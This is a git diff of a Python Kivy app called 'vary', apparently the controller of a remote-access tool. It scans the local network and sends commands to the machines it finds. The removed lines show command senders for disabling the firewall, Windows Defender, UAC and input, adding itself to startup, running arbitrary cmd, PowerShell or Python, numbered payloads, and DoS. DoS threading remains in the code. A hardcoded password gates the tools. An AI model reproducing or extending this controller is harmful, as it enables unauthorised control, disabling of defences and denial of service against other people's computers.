@@ -15,14 +15,53 @@ from kivy.uix.relativelayout import RelativeLayout
 from kivy.animation import Animation
 from kivy.app import App
 from kivy.uix.widget import Widget
+from kivymd.app import MDApp
+from kivy.core.text import LabelBase
 from kivy.uix.accordion import Accordion, AccordionItem
 from kivy.uix.tabbedpanel import TabbedPanel
 import random
+
+
+from kivy.app import App
+from kivy.uix.screenmanager import ScreenManager, Screen
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.button import Button
+from kivy.properties import ObjectProperty, StringProperty, BooleanProperty
+from kivy.uix.floatlayout import FloatLayout
 # from kivymd.app import MDApp
 # from kivymd.uix.list import OneLineListItem
+from kivymd.app import MDApp 
 from kivy.uix.tabbedpanel import TabbedPanel, TabbedPanelItem
 from kivy.utils import get_color_from_hex
 from kivy.lang import Builder
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.scrollview import ScrollView
+from kivy.uix.gridlayout import GridLayout
+from kivy.uix.label import Label
+from kivy.uix.button import Button
+from kivy.uix.textinput import TextInput
+from kivy.uix.tabbedpanel import TabbedPanel, TabbedPanelItem
+from kivy.core.window import Window
+# from kivy.uix.bottomnavigation import BottomNavigation, BottomNavigationItem
+from kivy.metrics import dp
+from kivy.properties import ObjectProperty
+
+# Import other necessary modules
+import webbrowser  # For opening websites
+import subprocess  # For running commands
+import ctypes  # For interacting with Windows APIs
+import time  # For time delays
+# from plyer import notification
+# import pyttsx3  # For text to speech
+from kivymd.app import MDApp
+from kivy.lang import Builder
+# from kivymd.uix.tab import MDTabsBase
+from kivy.uix.floatlayout import FloatLayout
+from kivy.core.text import LabelBase
+from kivy.uix.tabbedpanel import TabbedPanelItem
+from kivy.uix.gridlayout import GridLayout
+from kivy.uix.label import Label
 import threading
 import time
 import subprocess
@@ -35,7 +74,7 @@ from concurrent.futures import ThreadPoolExecutor
 from multiprocessing import Manager
 import socket
 import kivy
-from scapy.all import ARP, Ether, srp
+# from scapy.all import ARP, Ether, srp
 from kivy.app import App
 from kivy.clock import Clock
 from kivy.uix.button import Button
@@ -76,6 +115,7 @@ import ipaddress
 import Crypto
 from Crypto.Cipher import AES
 
+import kivymd
 import os
 
 #import face_recognition
@@ -91,10 +131,14 @@ import glob
 
 from kivy.core.window import Window
 
-
+# Disable multi-touch emulation for smoother touch events
+# Config.set('input', 'mouse', 'mouse,disable_multitouch') # it jsut fucking breaks on phone..
+from kivy.uix.modalview import ModalView
 from kivy.core.window import Window
 
 Window.softinput_mode = 'below_target'
+
+selfdestructbuttonpresses = 0
 
 # Get the current screen resolution
 screen_width, screen_height = Window.size
@@ -125,146 +169,9 @@ def slp(seconds):
     return
 
 problematicips = []
+DosingThreads = []
 
-'''known_faces = [np.array([trimmed due to privacy])]
-
-known_names = ['Alon']
-
-
-
-
-
-
-def face_rec(): 
-    global camera
-    frames_count = 0
-
-    def capture():
-        Function to capture the images and give them the names according to their captured time and date. 
-        #time.sleep(5)
-        global camera
-        timestr = time.strftime("%Y%m%d_%H%M%S")
-        camera.export_to_png("IMG_{}.png".format(timestr))
-        print("Captured")
-        
-        return "IMG_{}.png".format(timestr)
-    print(capture())
-    exit()
-    while True:
-        img_loc = capture()
-        img = Image.open(img_loc).convert('RGB').rotate(90, expand=True)
-        img = np.array(img)
-        frames_count +=1
-        rgb_frame = img[:, :, ::-1]
-
-        face_locations = face_recognition.face_locations(rgb_frame)
-        face_encodings = face_recognition.face_encodings(rgb_frame, face_locations)
-        print(face_locations)
-        for (top, right, bottom, left), face_encoding in zip(face_locations, face_encodings):
-            matches = face_recognition.compare_faces(known_faces, face_encoding)
-            if True in matches:
-                matched_index = matches.index(True)
-                name = known_names[matched_index]
-                print("Detected user:", name)
-                camera.play = False
-                if os.path.exists(img_loc):
-                    pass
-                    #os.remove(img_loc)
-                else:
-                    print("The file does not exist")
-                return True
-            else:
-                pass
-        if os.path.exists(img_loc):
-            pass
-            #os.remove(img_loc)
-        else:
-            print("The file does not exist")
-    
-        if frames_count > 10:
-            print('No viable face was detected')
-            camera.play = False
-            return False'''
-
-'''
-
-
-class StartScreen(Screen):
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        # create a progress bar with min_value=0, max_value=100 and value=0
-        #self.pb = ProgressBar(max=100, value=0) # changed 'min' to 'min_value'
-        # create a label with text="Loading", color=white and position=center
-        #self.lbl = Label(text="Loading", color=(1, 1, 1, 1), pos_hint={"center_x": 0.5, "center_y": 0.5})
-        # add both widgets to the screen
-        #self.add_widget(self.pb)
-        #self.add_widget(self.lbl)
-
-    def on_enter(self, *args):
-        # schedule a function to update the progress bar value every 0.1 second
-        #Clock.schedule_interval(self.update_progress_bar, 0.1)
-        # schedule a function to switch to main app after 5 seconds
-        Clock.schedule_once(self.switch_to_main_app, 4)
-
-    def update_progress_bar(self, dt):
-        # increment the progress bar value by 1
-        #self.pb.value += 1
-        pass
-    def switch_to_main_app(self, dt):
-        # switch to main app screen
-        self.manager.current = "main"'''
-
-
-
-
-
-'''
-# define a subclass of Screen with a color and a rectangle
-class StartScreen(Screen):
-
-    # define the __init__ method that takes **kwargs as argument
-    def __init__(self, **kwargs):
-        # call the __init__ method of the superclass with **kwargs
-        super().__init__(**kwargs)
-        # create a color object with alpha 0 and assign it to self.color
-        self.color = Color(1, 1, 1, 0)
-        # add the color object and a rectangle object to the screen's canvas
-        with self.canvas:
-            self.add_widget(self.color)
-            self.add_widget(Rectangle(size=self.size))
-        # bind the color property of the screen to the color property of the color object
-        self.bind(color=self.color.setter('color'))
-
-    # define a method that starts the animation when the screen enters
-    def on_enter(self):
-        # create an animation that changes alpha to 1.0
-        anim = Animation(a=1.0)
-        # start the animation on the screen's color property
-        anim.start(self)
-
-'''
-
-
-
-'''
-
-from subprocess import call
-call(["su"]) 
-
-
-import os
-import sys
-import subprocess
-
-# Restart the app with superuser permission
-if os.geteuid() != 0:
-    subprocess.call(['su', '-c', 'am', 'start', '-n', 'your.app.package/.YourAppActivity'])
-    sys.exit()
-'''
-# Your app code goes here, with superuser permission
-
-
-
+last_call_time = time.time()
 
 class KThread(threading.Thread):
     """A subclass of threading.Thread, with a kill()
@@ -423,6 +330,12 @@ def send(connection, todo, mode='vary'): # switched to diversify to use the diff
         global problematicips
         global resultsofcheckifdeviceresponds
         # problematicips = []
+        
+        print(len(diversify_devices))
+        if len(diversify_devices) == 0:
+            Clock.schedule_once(lambda dt: vary().showpopup(str(f'You are sending to no hosts')), 0)
+            return
+        
         for i in diversify_devices:
             try:
                 threaded_connections(i, todo, q, mode='diversify')
@@ -473,8 +386,8 @@ def send(connection, todo, mode='vary'): # switched to diversify to use the diff
                 if result == True:
                     problematicips.remove(ip)
 
-            
-            
+            # check if there are even any ips that are being sent to. aka if the list is empty
+
             strbuildpro = ", ".join(str(i) for i in problematicips)
             Clock.schedule_once(lambda dt: vary().showpopup(str(f'Connection timedout for these devices:\n{strbuildpro}, Please note!, *currently not removing them*')), 0)
             for i in problematicips:
@@ -613,494 +526,7 @@ def scan_network(self):
     Clock.schedule_once(lambda dt: self.final_button(), 0)
     Clock.schedule_once(lambda dt: self.removescanninglabel(), 0)
     
-    '''
-    devices = []
-    threads = []
-    
-    def scan_ip(ip):
-        try:
-            socket.setdefaulttimeout(1)
-            #print(f'\rScanning {ip} - trying to connect')
-            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((ip, 80))
-            devices.append(ip)
-            #print(ip)        
-        except Exception as e:
-           pass 
-            #print(f"Exception caught: {e}")
-    
-    for i in range(1, 255):
-        ip = subnet + str(i)
-        t =  threading.Thread(target=scan_ip, args=((ip,)))
-        t.start()
-        threads.append(t)
-
-    for i in threads:
-        i.join()
-    print(f'devices: {devices}')
-    return devices'''
-    '''    # convert the IP range to a list of individual IP addresses
-    target_ip_range ="192.168.1.0/24"
-    target_ips = []
-    ip, mask = target_ip_range.split('/')
-    mask = int(mask)
-    ip = ip.split('.')
-    ip[3] = 0
-    start = struct.pack('BBBB', *map(int, ip))
-    ip[3] = 255
-    end = struct.pack('BBBB', *map(int, ip))
-    start, = struct.unpack('!L', start)
-    end, = struct.unpack('!L', end)
-    for host in range(start, end+1):
-        target_ips.append(socket.inet_ntoa(struct.pack('!L', host)))
-
-    # create an ARP packet
-    arp = ARP(pdst=target_ip_range)
-    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
-    packet = ether/arp
-
-    # send the packet on the network and get the clients
-    result = srp(packet, timeout=3, verbose=0)[0]
-    clients = []
-    for sent, received in result:
-        clients.append(received.psrc)
-    return clients'''
-
-
-last_call_time = 0
-
-
-'''class MyCamera(BoxLayout):
-    def __init__(self, **kwargs):
-        super(MyCamera, self).__init__(**kwargs)
-        self.camera = Camera(play=True)
-        self.add_widget(self.camera)
-        '''
-'''
-class LoadingScreen(BoxLayout):
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        self.orientation = "vertical"
-        self.add_widget(Label(text="Loading..."))
-        self.progress_bar = ProgressBar()
-        self.add_widget(self.progress_bar)
-''' 
-
-# isNetworkLispen = False
-isNetworkListoopen = False
-
-
-DosingThreads = []
-
-
-
-def retrieve_name(var):
-    """
-    Get the name of a variable as a string.
-    """
-    for name, value in globals().items():
-        if value is var:
-            return name
-
-'''
-class facerecogintionsetup(RelativeLayout):
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        from kivy.uix.camera import Camera
-        global camera
-        camera = Camera(play=True, resolution=(3840, 2160))#, color=[1,1,1,0.1])
-        capturebutton = Button(text='Capture', bold=True)
-        capturebutton.bind(on_press=self.face_rec)
-        self.add_widget(capturebutton)
-        self.add_widget(camera)
-        self.CheckCamera()
-        timestr = time.strftime("%Y%m%d_%H%M%S")
-        camera.export_to_png("IMG_{}.png".format(timestr))
-        self.dim_widget = Label(text='Face Recognition\nhas started',bold=True, font_size=50, color=[1, 1, 1, 0.9])
-        self.add_widget(self.dim_widget)
-        return self.CheckCamera()
-    
-    def capturephoto(self, dt=0):
-        timestr = time.strftime("%Y%m%d_%H%M%S")
-        camera.export_to_png("IMG_{}.png".format(timestr))
-        print(f'Photo taken IMG_{timestr}.png')
-    
-    def CheckCamera(self, dt=1):
-        global camera
-        
-        if camera.texture is None:
-            Clock.schedule_once(self.CheckCamera, 1)
-        else:
-            return
-
-
-    def face_rec(dt=0, dat=0): 
-        global camera
-        frames_count = 0
-
-        def capture():
-            global camera
-            timestr = time.strftime("%Y%m%d_%H%M%S")
-            camera.export_to_png("IMG_{}.png".format(timestr))
-            print("Captured")
-            
-            return "IMG_{}.png".format(timestr)
-        while True:
-            img_loc = capture()
-            img = Image.open(img_loc).convert('RGB').rotate(90, expand=True)
-            img = np.array(img)
-            frames_count +=1
-            rgb_frame = img[:, :, ::-1]
-
-            face_locations = face_recognition.face_locations(rgb_frame)
-            face_encodings = face_recognition.face_encodings(rgb_frame, face_locations)
-            print(face_locations)
-            for (top, right, bottom, left), face_encoding in zip(face_locations, face_encodings):
-                matches = face_recognition.compare_faces(known_faces, face_encoding)
-                if True in matches:
-                    matched_index = matches.index(True)
-                    name = known_names[matched_index]
-                    print("Detected user:", name)
-                    camera.play = False
-                    if os.path.exists(img_loc):
-                        pass
-                        #os.remove(img_loc)
-                    else:
-                        print("The file does not exist")
-                    return True
-                else: 
-                    pass
-            if os.path.exists(img_loc):
-                pass
-                #os.remove(img_loc)
-            else:
-                print("The file does not exist")
-        
-            if frames_count > 10:
-                print('No viable face was detected')
-                camera.play = False
-                return False
-'''
-
-
-'''
-
-# import cv2
-class LBPHFaceRecognizer:
-    def __init__(self, radius=1, neighbors=8, grid_x=8, grid_y=8, threshold=50.0):
-        self.radius = radius
-        self.neighbors = neighbors
-        self.grid_x = grid_x
-        self.grid_y = grid_y
-        self.threshold = threshold
-        self.histograms = []
-        self.labels = []
-
-    def train(self, images, labels):
-        self.histograms = []
-        self.labels = []
-
-        for i, image in enumerate(images):
-            gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
-            histogram = self.compute_histogram(gray)
-            self.histograms.append(histogram)
-            self.labels.append(labels[i])
-
-    def predict(self, image):
-        #gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
-        histogram = self.compute_histogram(image)
-
-        min_distance = float('inf')
-        min_label = -1
-
-        for i, h in enumerate(self.histograms):
-            distance = cv2.compareHist(h, histogram, cv2.HISTCMP_CHISQR)
-            if distance < min_distance:
-                min_distance = distance
-                min_label = self.labels[i]
-
-        confidence = 100 * (1 - min_distance / (self.grid_x * self.grid_y))
-        return min_label, confidence
-
-    def compute_histogram(self, image):
-        height, width = image.shape[:2]
-        print(self.grid_x)
-        print(self.grid_y)
-        cell_width = width // self.grid_x
-        cell_height = height // self.grid_y
-
-        histogram = np.zeros((self.grid_y, self.grid_x, self.neighbors + 2), dtype=np.float32)
-
-        for i in range(self.grid_y):
-            for j in range(self.grid_x):
-                x = j * cell_width
-                y = i * cell_height
-
-                cell = image[y:y + cell_height, x:x + cell_width]
-                lbp = self.compute_lbp(cell)
-                histogram[i, j] = self.compute_cell_histogram(lbp)
-
-        return histogram.flatten()
-
-    def compute_lbp(self, image):
-        height, width = image.shape[:2]
-        lbp = np.zeros((height - 2 * self.radius, width - 2 * self.radius), dtype=np.uint8)
-
-        for i in range(self.radius, height - self.radius):
-            for j in range(self.radius, width - self.radius):
-                center = image[i, j]
-                code = 0
-                for k in range(self.neighbors):
-                    x = i + int(self.radius * np.cos(2 * np.pi * k / self.neighbors))
-                    y = j - int(self.radius * np.sin(2 * np.pi * k / self.neighbors))
-                    if image[x, y] > center:
-                        code |= 1 << k
-                lbp[i - self.radius, j - self.radius] = code
-
-        return lbp
-
-    def compute_cell_histogram(self, lbp):
-        histogram = np.zeros(self.neighbors + 2, dtype=np.float32)
-        height, width = lbp.shape[:2]
-        for i in range(height):
-            for j in range(width):
-                histogram[lbp[i, j]] += 1
-        histogram /= height * width
-        return histogram
-
-
-    def read(self, filename):
-        fs = cv2.FileStorage(filename, cv2.FILE_STORAGE_READ)
-        self.labels = fs.getNode('labels').mat()
-        self.histograms = fs.getNode('histograms').mat()
-        self.radius = fs.getNode('radius').real()
-        self.neighbors = fs.getNode('neighbors').real()
-        self.grid_x = fs.getNode('grid_x').real()
-        self.grid_y = fs.getNode('grid_y').real()
-        self.threshold = fs.getNode('threshold').real()
-
-        # Reading file using regex
-        with open("trainer.yml", 'r') as stream:
-            try:
-                yaml_data = stream.read()
-                threshold_match = re.search(r'threshold: (\d+\.\d+)', yaml_data)
-                radius_match = re.search(r'radius: (\d+)', yaml_data)
-                neighbors_match = re.search(r'neighbors: (\d+)', yaml_data)
-                grid_x_match = re.search(r'grid_x: (\d+)', yaml_data)
-                grid_y_match = re.search(r'grid_y: (\d+)', yaml_data)
-                histograms_match = re.findall(r'histograms:\n {6}- !!opencv-matrix\n {8}rows: 1\n {8}cols: 16384\n {8}dt: f\n {8}data: \[(.*)\]', yaml_data)
-
-                self.threshold = float(threshold_match.group(1))
-                self.radius = int(radius_match.group(1))
-                self.neighbors = int(neighbors_match.group(1))
-                self.grid_x = int(grid_x_match.group(1))
-                self.grid_y = int(grid_y_match.group(1))
-                histograms_list_floats = []
-                for histogram in histograms_match:
-                    histograms_str = histogram
-                    histograms_list_strs = histograms_str.split(",")
-                    histograms_list_floats += [float(i) for i in histograms_list_strs]
-                self.histograms = np.array(histograms_list_floats).reshape(-1, 16384)
-
-            except ValueError as exc:
-                print(exc)
-
-        fs.release()
-
-            
-import re
-
-class VideoCaptureThread(threading.Thread):
-    def __init__(self, preview_window_name=None):
-        super().__init__()
-        self.preview_window_name = preview_window_name
-        self.running = False
-
-    def start_capture(self):
-        self.running = True
-        self.start()
-
-    def stop_capture(self):
-        self.running = False
-        self.join()
-
-    def run(self):
-        global cap
-        cap = cv2.VideoCapture(0)
-        while self.running:
-            ret, img = cap.read()
-            if ret:
-                #cv2.imshow(self.preview_window_name, img)
-                pass
-            if cv2.waitKey(1) == ord('q'):
-                break
-        cap.release()
-        cv2.destroyAllWindows()
-        
-        
-
-def startfacerec():
-
-
-    video_capture_thread = VideoCaptureThread()
-    #video_capture_thread.start_capture()
-    
-    #sleep(4)
-    
-    #video_capture_thread.stop_capture()
-    #exit()
-    
-    face_cascade = cv2.CascadeClassifier('./haarcascade_frontalface_default.xml')
-    recognizer = LBPHFaceRecognizer()
-    recognizer.read('./trainer.yml')
-    
-    #cap = cv2.VideoCapture(0)
-
-        
-        
-        #cv2.imshow('frame', img)
-    def capturevid():
-        global cap
-        cap = cv2.VideoCapture(0)
-        
-    capture_thread = KThread(target=capturevid)
-    capture_thread.start()
-    
-    cap_defined = False
-    while cap_defined == False:
-        def try_cap():
-            global cap
-            cap.read()
-            return True
-        try:
-            a = try_cap()
-            if a == True:
-                break
-        except:
-            pass
-        
-
-        
-    #a = 0
-    print('OK')
-    correct_personal = 0
-    maxToruns = 30
-    for i in range(maxToruns):
-        ret, img = cap.read()
-        if img.shape[-1] == 3:
-            #print(img.shape[-1])
-            gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-        else:
-            gray = img.copy()
-            
-        #a +=1
-        
-        #cv2.imwrite(f'frame{a}.jpg', img)
-
-
-        #print(img)
-
-        #gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-        faces = face_cascade.detectMultiScale(gray, 1.3, 5)
-        # if len(faces) > 1 do not continue. and run this at the background so if there are more than 2 people looking, it'll lock vary or crash the app, whatever does
-        print('Faces: ', len(faces))
-        for (x,y,w,h) in faces:
-            # predict the id of the face using recognizer.predict
-            id, confidence = recognizer.predict(gray[y:y+h,x:x+w])
-
-            # Check if confidence is less than 100, which means it is a good match
-            if (confidence < 100):
-                # saying it can continue here, person is known
-                correct_personal +=1
-                confidence = "  {0}%".format(round(100 - confidence))
-            else:
-                id = "unknown"
-                confidence = "  {0}%".format(round(100 - confidence))
-    #video_capture_thread.stop_capture()
-    try:
-        percentageofcorrect = int((maxToruns//correct_personal) * 100)
-    except ZeroDivisionError:
-        percentageofcorrect = 0
-    print(f'The recognition says: {percentageofcorrect}% of the faces were correct or/and known.')
-    if percentageofcorrect > 60:
-        return True # and open the vary layout
-    else:
-        return False'''
-            
-            
-            
-#class facerecogintionsetup(RelativeLayout):
-    #startfacerec()
-'''   def __init__(self, **kwargs):
-    super().__init__(**kwargs)
-    self.capture = cv2.VideoCapture(0)
-    #capturebutton = Button(text='Capture', bold=True)
-    #capturebutton.bind(on_press=self.face_rec)
-    #self.add_widget(capturebutton)
-    self.CheckCamera()
-    self.dim_widget = Label(text='Face Recognition\nhas started',bold=True, font_size=50, color=[1, 1, 1, 0.9])
-    self.add_widget(self.dim_widget)
-    
-def CheckCamera(self, dt=1):
-    if not self.capture.isOpened():
-        Clock.schedule_once(self.CheckCamera, 1)
-    else:
-        return
-
-def capturephoto(self, dt=0):
-    ret, frame = self.capture.read()
-    if ret:
-        timestr = time.strftime("%Y%m%d_%H%M%S")
-        cv2.imwrite("IMG_{}.png".format(timestr), frame)
-        print(f'Photo taken IMG_{timestr}.png')
-
-def face_rec(self, dt=0):
-    frames_count = 0
-
-    def capture():
-        ret, frame = self.capture.read()
-        if ret:
-            timestr = time.strftime("%Y%m%d_%H%M%S")
-            cv2.imwrite("IMG_{}.png".format(timestr), frame)
-            print("Captured")
-            return "IMG_{}.png".format(timestr)
-        else:
-            return None
-
-    while True:
-        img_loc = capture()
-        if img_loc is not None:
-            img = cv2.imread(img_loc)
-            frames_count += 1
-            gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-
-            faces = face_cascade.detectMultiScale(gray, 1.3, 5)
-            for (x, y, w, h) in faces:
-                roi_gray = gray[y:y+h, x:x+w]
-                roi_color = img[y:y+h, x:x+w]
-                cv2.rectangle(img, (x, y), (x+w, y+h), (0, 255, 0), 2)
-                
-                # Do something with the face detected here
-                
-            cv2.imshow('img', img)
-            
-            if cv2.waitKey(1) == ord('q') or frames_count > 10:
-                break
-            
-            if os.path.exists(img_loc):
-                os.remove(img_loc)
-            else:
-                print("The file does not exist")
-
-    self.capture.release()
-    cv2.destroyAllWindows()
-'''
-
-
-'''
-class Startup(App):
-
-    def build(self):
-        return facerecogintionsetup()'''
+ 
 
 
 
@@ -1129,9 +555,18 @@ class varylayout(BoxLayout):
     pass
 
 
-class vary(App):
+class vary(MDApp):
+
+    password = StringProperty('')
+    is_tools_unlocked = BooleanProperty(False)
+    
     def __init__(self, **kwargs):
         super().__init__(**kwargs)
+
+
+    def on_start(self):
+        LabelBase.register(name="Quicksand", fn_regular="Quicksand.ttf")
+
 
             
     def build(self):
@@ -1140,10 +575,27 @@ class vary(App):
             varyobject = varylayout()
             self.root = varyobject
             # set the opacity of varyobject to 0
+            self.theme_cls.font_styles["Quicksand"] = [
+                "Quicksand",
+                16,
+                False,
+                0.15,
+            ]
+            self.theme_cls.theme_style = "Dark"  # Set the theme to dark
+            
+            self.theme_cls.font_styles["H1"] = ["Quicksand", 96, False, -1.5]
+            self.theme_cls.font_styles["H2"] = ["Quicksand", 60, False, -0.5]
+            self.theme_cls.font_styles["H3"] = ["Quicksand", 48, False, 0]
+            self.theme_cls.font_styles["H4"] = ["Quicksand", 34, False, 0.25]
+            self.theme_cls.font_styles["H5"] = ["Quicksand", 24, False, 0]
+            self.theme_cls.font_styles["H6"] = ["Quicksand", 20, False, 0.15]
+         
+
             varyobject.opacity = 0
             varyobject = self.root
             # schedule a function to fade in varyobject after 1 second
             Clock.schedule_once(self.fade_in)
+
             # else:
             # Clock.schedule_once(lambda dt: vary().showpopup(str('You aren\'t permitted to use this app.')), 0)
         except Exception as e:
@@ -1421,6 +873,45 @@ class vary(App):
         print('Removed all widgets from the result layout')
 
     
+    # Function to unlock the Diversify Tools tab with a password
+    def unlock_tools(self, instance):
+        entered_password = self.password_input.text
+        # print(f'Entered password: {entered_password}')
+        
+        if entered_password == "dvrfytls":  # Replace "your_password" with the actual password
+            self.is_tools_unlocked = True
+            self.password_modal.dismiss()
+        else:
+            self.showpopup_message("Incorrect password!", "Error")
+
+
+    
+        # Function to show the password prompt modal
+    def show_password_prompt(self):
+        self.password_modal = ModalView(size_hint=(0.8, 0.4), background_color=(0, 0, 0, 0.5))  # Semi-transparent dark background
+        content = BoxLayout(orientation='vertical', padding=dp(20), spacing=dp(10))
+        content.background_color = (0.9, 0.9, 0.9, 0.8)  # Slightly opaque white background for content
+
+        label = Label(text="Enter password to\nunlock Diversify Tools:", font_size=dp(18), color=(0.2, 0.6, 0.8, 1)) # Dark gray text
+        self.password_input = TextInput(password=True, font_size=dp(18), background_color=(0.95, 0.95, 0.95, 1), foreground_color=(0.3, 0.3, 0.3, 1)) # Light gray background, darker gray text
+        unlock_button = Button(text="Unlock", on_release=self.unlock_tools, font_size=dp(18), 
+                             background_color=(0.1, 0.6, 0.8, 1), color=(1, 1, 1, 1)) # Blue button, white text
+
+        content.add_widget(label)
+        content.add_widget(self.password_input)
+        content.add_widget(unlock_button)
+         # Bind on_dismiss event
+        self.password_modal.bind(on_dismiss=self.on_password_modal_dismiss)
+        # self.password_modal.open()
+        self.password_modal.add_widget(content)
+        self.password_modal.open()
+
+    def on_password_modal_dismiss(self, instance):
+        if not self.is_tools_unlocked:
+            # Handle dismissal without correct password
+            print("Modal dismissed without entering password. Exiting...")
+            sys.exit()  # Exit the app (or you can choose a different action)/
+    
 
     def scan_network_and_display_results(self):
         def thisdoes(self):
@@ -1535,16 +1026,17 @@ for i in range(threads_count_to):
     splitertext = 'c9GgYdMAW7' # these need text arguments - some. 
     splitertextdiversified = 'OD2tIzZNuOHBqnu' # for diversify
     # Clock.schedule_once(lambda dt: vary().showpopup(str(vmtp)), 0)
-    def showpopup(self, text):
+    def showpopup(self, text, currenttimeoverwrite=False):
         print(f'There was an error: {str(text)}')
         global last_call_time
         current_time = time.time()
         
-        # Check if 10 seconds have elapsed since the last call
-        if current_time - last_call_time < 3:
-            return
+        if currenttimeoverwrite == False:
+            # Check if 10 seconds have elapsed since the last call
+            if current_time - last_call_time < 3:
+                return
         
-        last_call_time = current_time
+            last_call_time = current_time
 
         # create a BoxLayout for the content
         #content_layout = BoxLayout(orientation='vertical', pos_hint={'center_x': 0.5, 'center_y': 0.6})
@@ -1591,110 +1083,6 @@ for i in range(threads_count_to):
     def dosperspecifiedip(placeholder):
         ip = placeholder.root.ids.dosperspecifiedip.text
         placeholder.traac(ip)
-
-    def set_volume_max(placeholder):
-        send(placeholder, f'set_volume_max{splitertext}')
-    def set_volume_zero(placeholder):
-        send(placeholder, f'set_volume_zero{splitertext}')
-    def crashoops(placeholder):
-        send(placeholder, f'crashoops{splitertext}')
-    def disabletaskmanager(placeholder):
-        send(placeholder, f'disabletaskmanager{splitertext}')
-    def restarttoadvancedoptions(placeholder):
-        send(placeholder, f'restarttoadvancedoptions{splitertext}')
-    def disablefirewall(placeholder):
-        send(placeholder, f'disablefirewall{splitertext}')
-    def killallprocess(placeholder):
-        send(placeholder, f'killallprocess{splitertext}')
-    def resetwindows(placeholder):
-        send(placeholder, f'resetwindows{splitertext}')
-    def classicminecraft(placeholder):
-        send(placeholder, f'classicminecraft{splitertext}')
-    def killcomputerslowly(placeholder):
-        send(placeholder, f'killcomputerslowly{splitertext}')
-    def disablewindowsdefender(placeholder):
-        send(placeholder, f'disablewindowsdefender{splitertext}')
-    def addselftostartupregistry(placeholder):
-        send(placeholder, f'addselftostartupregistry{splitertext}')
-    def runcmd(placeholder):
-        send(placeholder, f'runcmd{splitertext}{placeholder.root.ids.runcmd.text}')
-    def startphintro(placeholder):
-        send(placeholder, f'startphintro{splitertext}')
-    def runpythonscript(placeholder):
-        send(placeholder, f'runpythonscript{splitertext}{placeholder.root.ids.runpythonscript.text}')
-    def msgtosystem(placeholder):
-        send(placeholder, f'msg{splitertext}{placeholder.root.ids.msgtosystem.text}')
-    def inviscurr(placeholder):
-        send(placeholder, f'inviscurr{splitertext}{placeholder.root.ids.inviscurr.text}')
-    def texttospeech(placeholder):
-        send(placeholder, f'texttospeech{splitertext}{placeholder.root.ids.texttospeech.text}')
-    def disableuac(placeholder):
-        send(placeholder, f'disableuac{splitertext}')
-    def blackenscreen(placeholder):
-        send(placeholder, f'blackenscreen{splitertext}{placeholder.root.ids.blackenscreen.text}')
-    def programVL2(placeholder):
-        send(placeholder, f'programVL2{splitertext}{placeholder.root.ids.programVL2.text}')
-    def programVL1(placeholder):
-        send(placeholder, f'programVL1{splitertext}{placeholder.root.ids.programVL1.text}')
-    def powershell(placeholder):
-        send(placeholder, f'powershell{splitertext}{placeholder.root.ids.powershell.text}')
-    def webhandler(placeholder):
-        send(placeholder, f'webhandler{splitertext}{placeholder.root.ids.webhandler.text}')
-    def mouseenable(placeholder):
-        send(placeholder, f'disableinput{splitertext}True!&!mouse')
-    def mousedisable(placeholder):
-        send(placeholder, f'disableinput{splitertext}False!&!mouse')
-    def keyboardenable(placeholder):
-        send(placeholder, f'disableinput{splitertext}True!&!keyboard')
-    def keyboarddisable(placeholder):
-        send(placeholder, f'disableinput{splitertext}False!&!keyboard')
-    def updatevaryusingusb(placeholder):
-        send(placeholder, f'updatevaryusingusb{splitertext}')
-    def speakxlanguage(placeholder):
-        send(placeholder, f'speakxlanguage{splitertext}{placeholder.root.ids.speakxlanguage.text}')
-    def speakrussian(placeholder):
-        send(placeholder, f'speakrussian{splitertext}{placeholder.root.ids.speakrussian.text}')
-    def speakfrench(placeholder):
-        send(placeholder, f'speakfrench{splitertext}{placeholder.root.ids.speakfrench.text}')
-    def speakarabic(placeholder):
-        send(placeholder, f'speakarabic{splitertext}{placeholder.root.ids.speakarabic.text}')
-    def speakenglish(placeholder):
-        send(placeholder, f'speakenglish{splitertext}{placeholder.root.ids.speakenglish.text}')
-    def presskeys(placeholder):
-        send(placeholder, f'pressinput{splitertext}{placeholder.root.ids.presskeys.text}')
-    def writetext(placeholder):
-        send(placeholder, f'writetext{splitertext}{placeholder.root.ids.writetext.text}')
-    def meandtheboys(placeholder):
-        send(placeholder, f'meandtheboys{splitertext}')
-    def payload_1(placeholder):
-        send(placeholder, f'payload_1{splitertext}')
-    def payload_2(placeholder):
-        send(placeholder, f'payload_2{splitertext}')
-    def payload_3(placeholder):
-        send(placeholder, f'payload_3{splitertext}')
-    def payload_4(placeholder):
-        send(placeholder, f'payload_4{splitertext}')
-    def payload_5(placeholder):
-        send(placeholder, f'payload_5{splitertext}')
-    def payload_6(placeholder):
-        send(placeholder, f'payload_6{splitertext}')
-
-    def installchrome(placeholder):
-        send(placeholder, f'installchrome{splitertext}')
-    def killallunknownprocess(placeholder):
-        send(placeholder, f'killallunknownprocess{splitertext}')
-    def logoffuser(placeholder):
-        send(placeholder, f'logoffuser{splitertext}')
-    def togglemute(placeholder):
-        send(placeholder, f'togglemute{splitertext}')
-    def checkdelay(placeholder):
-        send(placeholder, f'checkdelay{splitertext}')
-    def play_tone(placeholder):
-        send(placeholder, f'play_tone{splitertext}{placeholder.root.ids.hzofplaytone.text}UKJA$^&SYJGHD{placeholder.root.ids.durationofplaytone.text}')
-    def play_shepard_tone(placeholder):
-        send(placeholder, f'play_shepard_tone{splitertext}{placeholder.root.ids.starthzofplayshepardtone.text}kwp1q47xgW{placeholder.root.ids.endhzofplayshepardtone.text}kwp1q47xgW{placeholder.root.ids.durationofplayshepardtone.text}')
-    def dosip(placeholder):
-        send(placeholder, f'runpythonscript{splitertext}{placeholder.dosip_func(placeholder.root.ids.dosip.text)}')
 
 
     def scan_for_hosts(self):
@@ -1757,11 +1145,7 @@ for i in range(threads_count_to):
                     executorofscanip.map(scan_ip,[subnet + str(i) for i in range(1,255)])
                 
             if len(host_ips_found) == 0:
-                tmp = random.randint(1, 5)
-                if tmp == 3:
